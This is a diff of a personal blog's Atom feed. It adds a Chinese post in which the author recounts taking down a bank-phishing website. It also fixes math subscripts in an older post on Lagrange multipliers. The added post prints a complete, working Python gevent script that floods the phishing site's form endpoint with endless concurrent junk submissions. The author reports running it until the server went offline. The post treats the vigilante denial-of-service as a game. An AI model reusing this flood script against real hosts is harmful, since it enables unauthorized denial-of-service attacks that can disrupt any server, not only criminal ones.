@@ -4,13 +4,81 @@
  <title>hsfzxjy</title>
  <link href="http://hsfzxjy.github.io/" rel="self"/>
  <link href="http://hsfzxjy.github.io"/>
- <updated>2015-07-24T18:43:11+08:00</updated>
+ <updated>2015-07-24T21:34:21+08:00</updated>
  <id>http://hsfzxjy.github.io</id>
  <author>
    <name>Jinyi Xie</name>
    <email>956357208@qq.com</email>
  </author>
 
+ 
+ <entry>
+   <title>记一次 DoS 诈骗网站的经历</title>
+   <link href="http://hsfzxjy.github.io/how-to-fuck-a-bilk-site/"/>
+   <updated>2015-07-24T00:00:00+08:00</updated>
+   <id>http://hsfzxjy.github.io/how-to-fuck-a-bilk-site</id>
+   <content type="html">&lt;p&gt;题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 &lt;a href=&quot;http://wap.abchyd.com&quot;&gt;wap.abchyd.com&lt;/a&gt; 进行领取！【农业银行】&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;1024 元？哼！这个数还挺整，但一看就是诈骗短信：哪有银行的域名长得和天书一样？更何况，我又没有农行的账户。&lt;/p&gt;
+
+&lt;p&gt;正待删除时，一个念头划过脑海，指尖悬停在屏幕上方。&lt;/p&gt;
+
+&lt;p&gt;突然想起昨天在 Freebuf 上看到的一篇文章，说是一个黑帽把臭名昭著的“10086 诈骗”给调戏了一番，在其数据库里填满了垃圾。Freebuf 上许多黑技术我从来都是可望而不可即，唯独这个比较简单——不就是写个脚本嘛，几分钟的事。既然他骗人骗到我这里来了，何不好好调戏一下呢？&lt;/p&gt;
+
+&lt;p&gt;果断打开电脑，打开 Chrome，输入网址，映入眼帘的是一个表单（网站已被黑掉因此就没有图了，好吧我错了），要求用户填写 银行卡、密码、手机号还有一个逼格很高的验证码。&lt;/p&gt;
+
+&lt;p&gt;F12 分析，发现对各个字段的校验仅仅局限于长度的检查，连格式检查都没有。至于验证码，随便填写四个数字就可以通过了（真是弱爆了，好吗！）。表单提交后跳转到一个有菊花加载圈的页面——说是“稍等，切勿关闭页面”，但其实这个页面并不会跳转，也不会有其他的操作，只有那个菊花一直在转。扫一眼地址栏，发现是&lt;code&gt;asp&lt;/code&gt;结尾——这又给了我不小的鼓励（这里并没有黑微软的意思， ASP 是十年前的产物，放在现在可以说是弱的不行了）。&lt;/p&gt;
+
+&lt;p&gt;该怎么调戏呢？一个想法飞快地在脑海中产生——对了，就用高并发的垃圾数据拖爆它的数据库吧。这类钓鱼网站通常都是 IIS 6.0 + ASP + SQL SERVER，并且还是单机服务器，并发度一高机器很容易就垮了。&lt;/p&gt;
+
+&lt;p&gt;简单地谢了一个脚本：&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#! /usr/bin/python&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gevent.monkey&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gevent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;monkey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;patch_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gevent&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;uuid&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uuid1&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fuck&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uuid1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;fucking&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;http://www.abchyd.com/add_1.asp&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlencode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
+            &lt;span class=&quot;s&quot;&gt;&amp;#39;logonCardNum&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;s&quot;&gt;&amp;#39;netType&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;111111&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;s&quot;&gt;&amp;#39;tel&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;12345678900&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;s&quot;&gt;&amp;#39;randomId&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;1234&amp;#39;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}))&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;fucking&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;ok&amp;#39;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;gevent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;joinall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gevent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;spawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fuck&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;这里用 &lt;code&gt;gevent&lt;/code&gt; 将 Socket 由阻塞型改装为协程型，以提高请求的并发度。&lt;/p&gt;
+
+&lt;p&gt;接着，关掉所有的图形界面，只开一个终端（为了节省内存），运行 &lt;code&gt;./fuckit.py&lt;/code&gt;。哈哈哈，受死吧！&lt;/p&gt;
+
+&lt;p&gt;用平板再次打开该网址（电脑已经跑不起浏览器了），可以发现网站已经明显慢了下来，时不时还会有 500 错误。&lt;/p&gt;
+
+&lt;p&gt;两个小时后。&lt;/p&gt;
+
+&lt;p&gt;当我再次访问网站时，它已经完全当机了。用&lt;code&gt;nmap&lt;/code&gt;扫了一遍，也没有端口活着了。一台邪恶的服务器就这样被干掉了。&lt;/p&gt;
+
+&lt;p&gt;但我知道，这样的服务器，在世界上还存在着许多许多。曾经有段时间，不断遇到域名为 www.10086xxx.com 的诈骗网站。常常是一个域名被封了，另一个域名便冒出来，可见诈骗者拥有海量的资源。&lt;/p&gt;
+
+&lt;p&gt;这次的攻击只是一次游戏，一次尝试，得以成功只是因为对方太弱了。&lt;/p&gt;
+
+&lt;p&gt;真正的网络攻防战，远不止如此。&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>不能说的秘密</title>
@@ -1102,19 +1170,19 @@ sudo apt-get install sublime-text-2
 
 &lt;h1&gt;&lt;strong&gt;拉格朗日乘数法的表述&lt;/strong&gt;&lt;/h1&gt;
 
-&lt;p&gt;对于多值函数$y=f(x&lt;em&gt;1,x&lt;/em&gt;2,\ldots ,x&lt;em&gt;n)$以及约束条件$\phi(x&lt;/em&gt;1,x&lt;em&gt;2,\ldots,x&lt;/em&gt;n)=0$，若待定一个系数$\lambda$，则由方程组：&lt;/p&gt;
+&lt;p&gt;对于多值函数$y=f(x_1,x_2,\ldots ,x_n)$以及约束条件$\phi(x_1,x_2,\ldots,x_n)=0$，若待定一个系数$\lambda$，则由方程组：&lt;/p&gt;
 
-&lt;p&gt;$$\frac{\partial f}{\partial x&lt;em&gt;1}+\lambda\cdot{\partial \phi \over \partial x&lt;/em&gt;1}=0,$$&lt;/p&gt;
+&lt;p&gt;$$\frac{\partial f}{\partial x_1}+\lambda\cdot{\partial \phi \over \partial x_1}=0,$$&lt;/p&gt;
 
-&lt;p&gt;$$\frac{\partial f}{\partial x&lt;em&gt;2}+\lambda\cdot{\partial \phi \over \partial x&lt;/em&gt;2}=0,$$&lt;/p&gt;
+&lt;p&gt;$$\frac{\partial f}{\partial x_2}+\lambda\cdot{\partial \phi \over \partial x_2}=0,$$&lt;/p&gt;
 
 &lt;p&gt;$$\ldots$$&lt;/p&gt;
 
-&lt;p&gt;$$\frac{\partial f}{\partial x&lt;em&gt;n}+\lambda\cdot{\partial \phi \over \partial x&lt;/em&gt;n}=0,$$&lt;/p&gt;
+&lt;p&gt;$$\frac{\partial f}{\partial x_n}+\lambda\cdot{\partial \phi \over \partial x_n}=0,$$&lt;/p&gt;
 
-&lt;p&gt;$$\phi(x&lt;em&gt;1,x&lt;/em&gt;2,\ldots,x_n)=0$$&lt;/p&gt;
+&lt;p&gt;$$\phi(x_1,x_2,\ldots,x_n)=0$$&lt;/p&gt;
 
-&lt;p&gt;可得一系列的解。这些解即为$y=f(x&lt;em&gt;1,x&lt;/em&gt;2,\ldots ,x&lt;em&gt;n)$在约束条件$\phi(x&lt;/em&gt;1,x&lt;em&gt;2,\ldots,x&lt;/em&gt;n)=0$下可能的极值点。&lt;/p&gt;
+&lt;p&gt;可得一系列的解。这些解即为$y=f(x_1,x_2,\ldots ,x_n)$在约束条件$\phi(x_1,x_2,\ldots,x_n)=0$下可能的极值点。&lt;/p&gt;
 
 &lt;h1&gt;&lt;strong&gt;解&lt;/strong&gt;&lt;/h1&gt;
 
